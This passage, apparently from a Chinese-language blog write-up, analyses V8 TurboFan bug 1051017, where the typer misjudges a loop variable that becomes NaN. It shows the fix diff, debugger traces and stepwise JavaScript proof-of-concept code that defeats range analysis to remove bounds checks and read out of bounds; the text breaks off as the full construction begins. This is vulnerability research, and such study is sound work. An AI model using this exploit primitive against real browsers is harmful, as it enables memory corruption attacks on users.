+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (increment_min &gt;= 0) &#123;</span><br><span class="line">...</span><br><span class="line">&#125; else if (increment_max &lt;= 0) &#123;</span><br><span class="line">...</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // Shortcut: If the increment can be both positive and negative,</span><br><span class="line">    // the variable can go arbitrarily far, so just return integer.</span><br><span class="line">    return typer_-&gt;cache_-&gt;kInteger;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>回到上层调用，最终发现，该函数在<code>v8::internal::compiler::Typer::Run</code>时调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; return</span><br><span class="line">#0  0x00007f72745318b7 in v8::internal::compiler::GraphReducer::ReduceTop (this=0x7ffda768a7a8) at ../../src/compiler/graph-reducer.cc:156</span><br><span class="line">156	  Reduction reduction = Reduce(node);</span><br><span class="line">pwndbg&gt; return</span><br><span class="line">#0  v8::internal::compiler::GraphReducer::ReduceNode (this=0x7ffda768a7a8, node=0x561e3b26f350) at ../../src/compiler/graph-reducer.cc:60</span><br><span class="line">60	    &#125; else if (!revisit_.empty()) &#123;</span><br><span class="line">pwndbg&gt; return</span><br><span class="line">#0  0x00007f7274531ba0 in v8::internal::compiler::GraphReducer::ReduceGraph (this=0x7ffda768a7a8) at ../../src/compiler/graph-reducer.cc:81</span><br><span class="line">81	void GraphReducer::ReduceGraph() &#123; ReduceNode(graph()-&gt;end()); &#125;</span><br><span class="line">pwndbg&gt; return</span><br><span class="line">#0  v8::internal::compiler::Typer::Run (this=0x561e3b1baa50, roots=..., induction_vars=0x7ffda768a950) at ../../src/compiler/typer.cc:433</span><br><span class="line">433	  if (induction_vars != nullptr) &#123;</span><br></pre></td></tr></table></figure>
+<p>从以上调试情况来看，我们可以知道<code>Typer::Visitor::TypeInductionVariablePhi</code>函数是在<code>Typer</code>阶段用于确定<code>induction variables</code>循环变量的最终类型的。通过调试知道，JIT编译器认为poc里的这个循环，i最终类型为<code>typer_-&gt;cache_-&gt;kInteger;</code>，然而，在实际的普通js层，测试发现，i最终类型为<code>NaN</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    var x = -Infinity;</span><br><span class="line">    var i = 0;</span><br><span class="line">    for (; i &lt; 1; i += x) &#123;</span><br><span class="line">        if (i == -Infinity) x = +Infinity;</span><br><span class="line">    &#125;</span><br><span class="line">    return i;</span><br><span class="line">&#125;</span><br><span class="line">undefined</span><br><span class="line">foo()</span><br><span class="line">NaN</span><br></pre></td></tr></table></figure>
+<p>由此，可以知道，该漏洞使得<code>JIT</code>层面和普通<code>JS</code>层面对循环变量i的类型判断不一致，也就是在<code>JIT</code>层面有一个类型混淆。</p>
+<h3 id="漏洞修复分析"><a href="#漏洞修复分析" class="headerlink" title="漏洞修复分析"></a>漏洞修复分析</h3><p>我们来看一下该漏洞是如何被修复的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-  // We only handle integer induction variables (otherwise ranges</span><br><span class="line">-  // do not apply and we cannot do anything).</span><br><span class="line">-  if (!both_types_integer || maybe_nan) &#123;</span><br><span class="line">+  // We only handle integer induction variables (otherwise ranges do not apply</span><br><span class="line">+  // and we cannot do anything). Moreover, we don&#x27;t support infinities in</span><br><span class="line">+  // &#123;increment_type&#125; because the induction variable can become NaN through</span><br><span class="line">+  // addition/subtraction of opposing infinities.</span><br><span class="line">+  if (!initial_type.Is(typer_-&gt;cache_-&gt;kInteger) ||</span><br><span class="line">+      !increment_type.Is(typer_-&gt;cache_-&gt;kInteger) ||</span><br><span class="line">+      increment_type.Min() == -V8_INFINITY ||</span><br><span class="line">+      increment_type.Max() == +V8_INFINITY) &#123;</span><br></pre></td></tr></table></figure>
+<p>主要是在原来这个if里面增加了两个条件，判断<code> increment_type.Min()</code>和<code> increment_type.Max()</code>的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// We only handle integer induction variables (otherwise ranges</span><br><span class="line">// do not apply and we cannot do anything).</span><br><span class="line">if (!both_types_integer || maybe_nan) &#123;</span><br><span class="line">  // Fallback to normal phi typing, but ensure monotonicity.</span><br><span class="line">  // (Unfortunately, without baking in the previous type, monotonicity might</span><br><span class="line">  // be violated because we might not yet have retyped the incrementing</span><br><span class="line">  // operation even though the increment&#x27;s type might been already reflected</span><br><span class="line">  // in the induction variable phi.)</span><br><span class="line">  Type type = NodeProperties::IsTyped(node) ? NodeProperties::GetType(node)</span><br><span class="line">                                            : Type::None();</span><br><span class="line">  for (int i = 0; i &lt; arity; ++i) &#123;</span><br><span class="line">    type = Type::Union(type, Operand(node, i), zone());</span><br><span class="line">  &#125;</span><br><span class="line">  return type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果两个值分别为<code> -V8_INFINITY</code>和<code> +V8_INFINITY</code>，那么经过<code>type = Type::Union(type, Operand(node, i), zone());</code>操作，type类型为<code>NaN</code>与JS层面保持一致。</p>
+<h2 id="0x03-issue-1051017-漏洞利用"><a href="#0x03-issue-1051017-漏洞利用" class="headerlink" title="0x03 issue 1051017 漏洞利用"></a>0x03 issue 1051017 漏洞利用</h2><h3 id="OOB数组构造"><a href="#OOB数组构造" class="headerlink" title="OOB数组构造"></a>OOB数组构造</h3><p>首先，在原有的基础上加入一个数组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function opt(index) &#123;</span><br><span class="line">    var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];</span><br><span class="line">    var x = -Infinity;</span><br><span class="line">    var i = 0;</span><br><span class="line">    for (; i &lt; 1; i += x) &#123;</span><br><span class="line">        if (i == -Infinity) x = +Infinity;</span><br><span class="line">    &#125;</span><br><span class="line">    //compiler:Range(1,INF)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    var x = Math.max(i,1);</span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%PrepareFunctionForOptimization(opt);</span><br><span class="line">print(Object.is(opt(), NaN));</span><br><span class="line">print(Object.is(opt(), NaN));</span><br><span class="line">%OptimizeFunctionOnNextCall(opt);</span><br><span class="line">print(Object.is(opt(), NaN));</span><br></pre></td></tr></table></figure>
+<p>运行结果并无差异</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/v8/out.gn/x64.debug# ./d8 p.js --allow-natives-syntax</span><br><span class="line">true</span><br><span class="line">true</span><br><span class="line">true</span><br></pre></td></tr></table></figure>
+<p>我们查看一下IR图<br>可以发现在<code>Typer</code>阶段，<code>var x = Math.max(i,1);</code>这句已经形成了一个节点为<code>Range(1,inf)</code><br><img src="https://p5.ssl.qhimg.com/t01ab096c1218a67a43.png"><br>我们再来看一下加入修复补丁以后的v8运行的IR图，修复后其值为<code>NaN</code><br><img src="https://p1.ssl.qhimg.com/t0154391966a37b1944.png"><br>现在的情况是编译器认为其值为<code>Range(1,INF)</code>，而真实值为<code>NaN</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//compiler:Range(1,INF)</span><br><span class="line">//reality:NaN</span><br><span class="line">var x = Math.max(i,1);</span><br></pre></td></tr></table></figure>
+<p>现在，我们需要利用某种方法，使得<code>compiler</code>形成的Range在数组长度之内，而<code>reality</code>真值则实际大于数组长度。考虑做如下运算</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//compiler:Range(-INF,-1)</span><br><span class="line">//reality:NaN</span><br><span class="line">x = -x; </span><br><span class="line">//compiler:Range(-2,-1)</span><br><span class="line">//reality:NaN</span><br><span class="line">x = Math.max(x,-2);</span><br><span class="line">//compiler:Range(-2,-1)</span><br><span class="line">//reality:0</span><br><span class="line">x &gt;&gt;= 0; </span><br></pre></td></tr></table></figure>
+<p>首先，将区间取反，这样，对于编译器来说是<code>Range(-INF,-1)</code>而真值却为<code>NaN</code>，接下来再用max函数，使得Range估算为<code>(-2,-1)</code>,真值却仍然为<code>NaN</code>，然后利用<code>&gt;&gt;</code>运算，<code>&gt;&gt; 0 </code>运算可以使得<code>NaN</code>的值变为0，使得编译器认为<code>Range(-2,-1)</code>，而真值为0。<br>然后，我们查看IR图<br><img src="https://p4.ssl.qhimg.com/t01eada738d883781db.png"><br>正如预料的那样，编译器的最终评估为<code>Range(-2,-1)</code>。<br>为了进一步调试真实值的计算过程，我们使用如下代码进行调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function opt(index) &#123;</span><br><span class="line">    var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];</span><br><span class="line">    var x = -Infinity;</span><br><span class="line">    var i = 0;</span><br><span class="line">    for (; i &lt; 1; i += x) &#123;</span><br><span class="line">        if (i == -Infinity) x = +Infinity;</span><br><span class="line">    &#125;</span><br><span class="line">    //compiler:Range(1,INF)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    var x = Math.max(i,1); //</span><br><span class="line">    //compiler:Range(-INF,-1)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    x = -x; //</span><br><span class="line">    //compiler:Range(-2,-1)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    x = Math.max(x,-2);</span><br><span class="line">    //compiler:Range(-2,-1)</span><br><span class="line">    //reality:0</span><br><span class="line">    x &gt;&gt;= 0; //</span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br><span class="line">%PrepareFunctionForOptimization(opt);</span><br><span class="line">print(opt(5));</span><br><span class="line">%OptimizeFunctionOnNextCall(opt);</span><br><span class="line">print(opt(5));</span><br><span class="line">%SystemBreak();</span><br><span class="line">print(opt(5));</span><br></pre></td></tr></table></figure>
+<p>使用如下参数进行调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set args --allow-natives-syntax ./p.js -print-opt-code</span><br></pre></td></tr></table></figure>
+<p>在打印出JIT代码和地址后，我们在JIT代码地址出断点然后调试<br>这里是for循环的逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; u rip</span><br><span class="line">   0x257b00082b8c    vpsllq xmm3, xmm3, 0x36</span><br><span class="line">   0x257b00082b91    vpsrlq xmm3, xmm3, 2</span><br><span class="line">   0x257b00082b96    vmovapd xmm1, xmm0</span><br><span class="line">   0x257b00082b9a    vmovapd xmm2, xmm0</span><br><span class="line">   0x257b00082b9e    jmp    0x257b00082bb4 &lt;0x257b00082bb4&gt;</span><br><span class="line">    ↓</span><br><span class="line"> ► 0x257b00082bb4    vucomisd xmm3, xmm2</span><br><span class="line">   0x257b00082bb8    seta   dl</span><br><span class="line">   0x257b00082bbb    movzx  edx, dl</span><br><span class="line">   0x257b00082bbe    cmp    edx, 0</span><br><span class="line">   0x257b00082bc1    je     0x257b00082be9 &lt;0x257b00082be9&gt;</span><br><span class="line"> </span><br><span class="line">   0x257b00082bc7    cmp    rsp, qword ptr [r13 + 0x60]</span><br><span class="line">pwndbg&gt; p $xmm3</span><br><span class="line">$14 = &#123;</span><br><span class="line">  v4_float = &#123;0, 1.875, 0, 1.875&#125;, </span><br><span class="line">  v2_double = &#123;1, 1&#125;, </span><br><span class="line">  v16_int8 = &#123;0, 0, 0, 0, 0, 0, -16, 63, 0, 0, 0, 0, 0, 0, -16, 63&#125;, </span><br><span class="line">  v8_int16 = &#123;0, 0, 0, 16368, 0, 0, 0, 16368&#125;, </span><br><span class="line">  v4_int32 = &#123;0, 1072693248, 0, 1072693248&#125;, </span><br><span class="line">  v2_int64 = &#123;4607182418800017408, 4607182418800017408&#125;, </span><br><span class="line">  uint128 = 84987514980498058628394346335474548736</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p $xmm2</span><br><span class="line">$15 = &#123;</span><br><span class="line">  v4_float = &#123;0, -nan(0x700000), 0, -nan(0x700000)&#125;, </span><br><span class="line">  v2_double = &#123;-inf, -inf&#125;, </span><br><span class="line">  v16_int8 = &#123;0, 0, 0, 0, 0, 0, -16, -1, 0, 0, 0, 0, 0, 0, -16, -1&#125;, </span><br><span class="line">  v8_int16 = &#123;0, 0, 0, -16, 0, 0, 0, -16&#125;, </span><br><span class="line">  v4_int32 = &#123;0, -1048576, 0, -1048576&#125;, </span><br><span class="line">  v2_int64 = &#123;-4503599627370496, -4503599627370496&#125;, </span><br><span class="line">  uint128 = 340199290171201906239760359964582871040</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当for循环逻辑结束后，此时查看循环变量i的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x257b00082bf2    vmovapd xmm3, xmm2</span><br><span class="line">   0x257b00082bf6    vpcmpeqd xmm4, xmm4, xmm4</span><br><span class="line">   0x257b00082bfa    vpsllq xmm4, xmm4, 0x3f</span><br><span class="line">   0x257b00082bff    vxorpd xmm0, xmm4, xmm3</span><br><span class="line">   0x257b00082c03    vpcmpeqd xmm3, xmm3, xmm3</span><br><span class="line">   0x257b00082c07    vpsllq xmm3, xmm3, 0x3e</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7ffe9b633928 ◂— 0xc /* &#x27;\x0c&#x27; */</span><br><span class="line">01:0008│      0x7ffe9b633930 ◂— 0x84</span><br><span class="line">02:0010│      0x7ffe9b633938 —▸ 0x257b08240cf5 ◂— 0xb90000020a082801</span><br><span class="line">03:0018│      0x7ffe9b633940 —▸ 0x257b0825018d ◂— 0xe9080406e9082802</span><br><span class="line">04:0020│      0x7ffe9b633948 —▸ 0x257b08240cf5 ◂— 0xb90000020a082801</span><br><span class="line">05:0028│ rbp  0x7ffe9b633950 —▸ 0x7ffe9b6339b0 —▸ 0x7ffe9b6339d8 —▸ 0x7ffe9b633a40 —▸ 0x7ffe9b633a90 ◂— ...</span><br><span class="line">06:0030│      0x7ffe9b633958 —▸ 0x7f23c7e30ad1 (Builtins_InterpreterEntryTrampoline+209) ◂— mov    r14, qword ptr [rbp - 0x18]</span><br><span class="line">07:0038│      0x7ffe9b633960 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0     257b00082bf2</span><br><span class="line">   f 1                c</span><br><span class="line">   f 2               84</span><br><span class="line">   f 3     257b08240cf5</span><br><span class="line">   f 4     257b0825018d</span><br><span class="line">   f 5     257b08240cf5</span><br><span class="line">   f 6     7ffe9b6339b0</span><br><span class="line">   f 7     7f23c7e30ad1 Builtins_InterpreterEntryTrampoline+209</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p $xmm2</span><br><span class="line">$23 = &#123;</span><br><span class="line">  v4_float = &#123;0, -nan(0x780000), 0, -nan(0x700000)&#125;, </span><br><span class="line">  v2_double = &#123;-nan(0x8000000000000), -inf&#125;, </span><br><span class="line">  v16_int8 = &#123;0, 0, 0, 0, 0, 0, -8, -1, 0, 0, 0, 0, 0, 0, -16, -1&#125;, </span><br><span class="line">  v8_int16 = &#123;0, 0, 0, -8, 0, 0, 0, -16&#125;, </span><br><span class="line">  v4_int32 = &#123;0, -524288, 0, -1048576&#125;, </span><br><span class="line">  v2_int64 = &#123;-2251799813685248, -4503599627370496&#125;, </span><br><span class="line">  uint128 = 340199290171201906239762611764396556288</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>i现在是<code>-NaN</code>，执行<code>x = -x</code>以后·，来到<code>x = Math.max(x,-2);</code>逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p $xmm3</span><br><span class="line">$27 = &#123;</span><br><span class="line">  v4_float = &#123;0, -2, 0, -2&#125;, </span><br><span class="line">  v2_double = &#123;-2, -2&#125;, </span><br><span class="line">  v16_int8 = &#123;0, 0, 0, 0, 0, 0, 0, -64, 0, 0, 0, 0, 0, 0, 0, -64&#125;, </span><br><span class="line">  v8_int16 = &#123;0, 0, 0, -16384, 0, 0, 0, -16384&#125;, </span><br><span class="line">  v4_int32 = &#123;0, -1073741824, 0, -1073741824&#125;, </span><br><span class="line">  v2_int64 = &#123;-4611686018427387904, -4611686018427387904&#125;, </span><br><span class="line">  uint128 = 255211775190703847611366013629108322304</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p $xmm0</span><br><span class="line">$28 = &#123;</span><br><span class="line">  v4_float = &#123;0, nan(0x780000), 0, nan(0x700000)&#125;, </span><br><span class="line">  v2_double = &#123;nan(0x8000000000000), inf&#125;, </span><br><span class="line">  v16_int8 = &#123;0, 0, 0, 0, 0, 0, -8, 127, 0, 0, 0, 0, 0, 0, -16, 127&#125;, </span><br><span class="line">  v8_int16 = &#123;0, 0, 0, 32760, 0, 0, 0, 32752&#125;, </span><br><span class="line">  v4_int32 = &#123;0, 2146959360, 0, 2146435072&#125;, </span><br><span class="line">  v2_int64 = &#123;9221120237041090560, 9218868437227405312&#125;, </span><br><span class="line">  uint128 = 170058106710732674498851936011657674752</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后<code>&gt;&gt; 0 </code>运算被转换为了如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x257b00082c5e    vcvttsd2si edx, xmm3</span><br><span class="line">0x257b00082c62    lea    eax, [rdx + rdx]</span><br><span class="line">RAX  0x0</span><br><span class="line">RDX  0x80000000</span><br></pre></td></tr></table></figure>
+<p>通过调试，我们发现，生成的JIT代码是没有问题的，确实是按照<code>NaN</code>来运算，<code>bug</code>仅出现在<code>IR</code>分析阶段。接下来，我们继续构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function opt(index) &#123;</span><br><span class="line">    var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];</span><br><span class="line">    var x = -Infinity;</span><br><span class="line">    var i = 0;</span><br><span class="line">    for (; i &lt; 1; i += x) &#123;</span><br><span class="line">        if (i == -Infinity) x = +Infinity;</span><br><span class="line">    &#125;</span><br><span class="line">    //compiler:Range(1,INF)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    var x = Math.max(i,1); //</span><br><span class="line">    //compiler:Range(-INF,-1)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    x = -x; //</span><br><span class="line">    //compiler:Range(-2,-1)</span><br><span class="line">    //reality:NaN</span><br><span class="line">    x = Math.max(x,-2);</span><br><span class="line">    //compiler:Range(-2,-1)</span><br><span class="line">    //reality:0</span><br><span class="line">    x &gt;&gt;= 0; //</span><br><span class="line">    //compiler:Range(0,1)</span><br><span class="line">    //reality:2</span><br><span class="line">    x += 2;</span><br><span class="line">    //compiler:Range(0,7)</span><br><span class="line">    //reality:Range(0,7)</span><br><span class="line">    index &amp;= 0x7;</span><br><span class="line">    //compiler:Range(0,7)</span><br><span class="line">    //reality:Range(0,14)</span><br><span class="line">    index *= x;</span><br><span class="line">    return a[index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样可以使得编译器的估测值比真实运算结果小，由此发生溢出。运行发现程序直接崩溃</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/v8/out.gn/x64.bug# ./d8 poc.js --trace-turbo --allow-natives-syntax</span><br><span class="line">Concurrent recompilation has been disabled for tracing.</span><br><span class="line">undefined</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Begin compiling method opt using TurboFan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Finished compiling method opt using TurboFan</span><br><span class="line">Trace/breakpoint trap (core dumped)</span><br></pre></td></tr></table></figure>
+<p>分析IR图，<code>checkbounds</code>的<code>Range(0,7)</code>在数组长度之内，在后续，该<code>checkbounds</code>会被移除<br><img src="https://p2.ssl.qhimg.com/t010adfa6d49da0f250.png"><br>在<code>V8.TFEffectLinearization 369</code>阶段，已经没有了边界检查，因此也可以溢出<br><img src="https://p1.ssl.qhimg.com/t01eb68dc5b1eea52b3.png"><br>从IR图中，未分析出任何异常，因此，我们继续调试JIT代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> R8   0x80000000</span><br><span class="line"> R9   0x55f4d8748520 —▸ 0x17608100000 ◂— 0x40000</span><br><span class="line"> R10  0x4023cccccccccccd</span><br><span class="line"> R11  0x5</span><br><span class="line">*R12  0x17608243c81 ◂— 0x310000005408040b</span><br><span class="line"> R13  0x17600000000 —▸ 0x7ffebe6b7a18 ◂— 0x17600000000</span><br><span class="line"> R14  0x1760825009d ◂— 0x89000000e0080409</span><br><span class="line"> R15  0x55f4d87144c0 —▸ 0x7f451f0e2360 (Builtins_WideHandler) ◂— lea    rbx, [rip - 7]</span><br><span class="line"> RBP  0x7ffebe6b67b0 —▸ 0x7ffebe6b6810 —▸ 0x7ffebe6b6838 —▸ 0x7ffebe6b68a0 —▸ 0x7ffebe6b68f0 ◂— ...</span><br><span class="line"> RSP  0x7ffebe6b6780 —▸ 0x7ffebe6b67c0 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">*RIP  0x17600082d2b ◂— add    r8d, 2</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x17600082d12    mov    r11, qword ptr [rbp + 0x10]</span><br><span class="line">   0x17600082d16    sar    r11d, 1</span><br><span class="line">   0x17600082d19    movabs r12, 0x17608243a45</span><br><span class="line">   0x17600082d23    mov    r12d, dword ptr [r12 + 3]</span><br><span class="line">   0x17600082d28    add    r12, r13</span><br><span class="line"> ► 0x17600082d2b    add    r8d, 2</span><br></pre></td></tr></table></figure>
+<p>调试中看出,在执行<code>x += 2;</code>时，x(寄存器r8)的值仍然为<code>0x80000000</code>，最终使得运算的下标为<code> R8   0x8000000a</code>，即有一个符号位的存在，因此，我们可以在最后添加一个移位操作，用于移除<code>NaN</code>计算造成的符号位。完整的OOB构造方法如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">function opt(index) &#123;</span><br><span class="line">    var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];</span><br><span class="line">    var x = 